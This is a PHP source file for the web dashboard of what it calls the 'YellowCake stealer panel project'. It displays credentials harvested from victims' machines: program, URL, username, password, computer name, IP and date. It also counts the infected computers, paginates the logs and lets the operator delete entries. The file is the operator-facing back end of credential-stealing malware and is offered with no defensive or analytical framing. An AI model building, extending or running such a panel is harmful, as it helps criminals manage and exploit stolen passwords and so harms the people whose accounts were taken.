<?php 
/* YellowCake stealer panel project
August 2021
*/
require_once('./includes/auth.php'); 
require_once('connect.php'); // does all the db connection
require_once('./includes/functions.php'); // general functions
require_once('config.php'); // general & pagination

if (isset($_POST['deleteBtn'])) { /* Delete logs */

	if (isset($_POST['delbox'])) {
		foreach ($_POST['delbox'] as $box) {
			$query = "DELETE FROM logs WHERE id=?";
			$query = mysqli_prepare($conn, $query);
			mysqli_stmt_bind_param($query, 'i', $box); // i for int
			mysqli_stmt_execute($query);
			

		}
	}
}
?>
<!doctype html>
<html lang="en">
<head>
	<title>YellowCake Panel</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	
</head>
<body>



  <!-- Top menu -->
<?php include_once('./includes/header.php') ?>

<div class="top-text">
	<h1>Welcome</h1>
	<?php
	echo '<p>Page: '. basename($_SERVER['PHP_SELF']) .'</p>';
	?>
</div>

<?php
		
	if(isset($_GET['page']) && pageValid($_GET['page'])) {
		$page = $_GET['page']; //
	} else {
		$page = 1; //default to first page
	}
		
	$startPage = ($page - 1) * $logsPerPage;
	$pageResult = mysqli_query($conn, "SELECT * FROM logs LIMIT $startPage, $logsPerPage");
		

	$sql = "SELECT id, program, url, user, pass, pc, postdate, ip FROM logs";

	$result = mysqli_query($conn, $sql);
	$totalRecords = mysqli_num_rows($result);

	$distinctLogs = "SELECT COUNT(DISTINCT pc) FROM logs";
	$distinct = mysqli_query($conn, $distinctLogs);
	$total = mysqli_fetch_row($distinct);
	
	//$lastLog = "SELECT postdate FROM logs ORDER BY id DESC LIMIT 1"; // get the last entry
	$mostRecent = mysqli_query($conn, "SELECT postdate FROM logs ORDER BY id DESC LIMIT 1");
	$lastLog = mysqli_fetch_assoc($mostRecent);
?>

<div class="top-info">

	<div class="info-box">
		<!-- <h2>Logs</h2> -->
		<h3>Total Logs</h3>
		<?php echo '<p>'.mysqli_num_rows($result).'</p>'; ?>
	</div>
	<div class="info-box">
		<h3>Last Log</h3>
		<!-- <p>Today</p> -->
		<?php echo '<p>'.$lastLog['postdate'].'</p>'; ?>
	</div>
	<div class="info-box">
		<h3>Total Users</h3>
		<?php echo '<p>'.$total[0].'</p>'; ?>
	</div>
	
</div>

<div class="table-container">
	<form method="post" action="index.php">
	<table class="log-table">
	  <thead>
	    <tr>
		  <th>Program</th>
		  <th>URL</th>
		  <th>Username</th>
		  <th>Password</th>
		  <th>Computer</th>
		  <th>Date</th>
		  <th>IP</th>
		  <th><input type="checkbox" name="box1" onchange="checkAllBoxes()" /></th>
	    </tr>
	  </thead>

		<?php
		/*
		$sql = "SELECT id, program, url, user, pass, pc, postdate, ip FROM logs";
		$result = mysqli_query($conn, $sql); */
		
		$sql = "SELECT * FROM logs LIMIT $startPage, $logsPerPage";
		$result = mysqli_query($conn, $sql);
		
		echo '<tbody>';
		if (mysqli_num_rows($result) > 0) {
			while ($row = mysqli_fetch_assoc($result)) {
				echo '<tr>'. PHP_EOL;
				echo '<td>'.sanitize($row["program"]).'</td>'. PHP_EOL;
				echo '<td>'.sanitize($row["url"]).'</td>'. PHP_EOL;
				echo '<td>'.sanitize($row["user"]).'</td>'. PHP_EOL;
				echo '<td>'.sanitize($row["pass"]).'</td>'. PHP_EOL;
				echo '<td>'.sanitize($row["pc"]).'</td>'. PHP_EOL;
				echo '<td>'.sanitize($row["postdate"]).'</td>'. PHP_EOL;
				echo '<td>'.sanitize($row["ip"]).'</td>'. PHP_EOL;
				echo '<td><input type="checkbox" name="delbox[]" value="'. $row["id"].'" /></td>'. PHP_EOL;
				echo '</tr>'. PHP_EOL;
			}
		} else {
			//echo '<p>0 results :(</p>'. PHP_EOL;
			echo '<tr>'. PHP_EOL;
			echo '<td><p>0 results :(</p></td>'. PHP_EOL;
			echo '</tr>'. PHP_EOL;
		}
		echo '</tbody>';
		mysqli_close($conn);
		?>
	</table>
	
	<div class="inline-container">
		<div class="table-page-num">
			<!-- <p>Page 1</p> -->
			<?php
			// pagination part
			$totalPages = ceil($totalRecords / $logsPerPage);
			$pageLinks = '';
			
			if ($page > 1) {
				echo '<a class="pag-link" href="index.php?page='.($page-1).'">Prev</a>';
			}
			for ($i=1; $i <= $totalPages; $i++) {
				if ($i == $page) {
					$pageLinks .= '<a class="pag-link pag-active" href="index.php?page='.$i.'">'.$i.'</a>';
				} else {
					$pageLinks .= '<a class="pag-link" href="index.php?page='.$i.'">'.$i.'</a>';
				}
			}
			echo $pageLinks;
			
			if ($page < $totalPages) {
				echo '<a class="pag-link" href="index.php?page='.($page+1).'">Next</a>';
			}
			?>
			
			
		</div>
		<div class="table-buttons">
			<button type="button" class="btn" id="selectAll" onclick="selectAllBoxes('.log-table input', true)">Select All</button>
			<button type="button" class="btn" id="unselectAll" onclick="selectAllBoxes('.log-table input', false)">Unselect All</button>
			
				<!-- <button class="btn" name="deleteBtn">Delete</button> type="button" stops the form from submitting -->
				<input type="submit" name="deleteBtn" value="Delete" />
			
		</div>
	</div>
	</form>
</div>

	<footer>
		<p>Panel 2021</p>
		<p>Made with: html, css, javascript, php & sql.</p>
	</footer>

	<script src="js/script.js"></script>
</body>
</html>
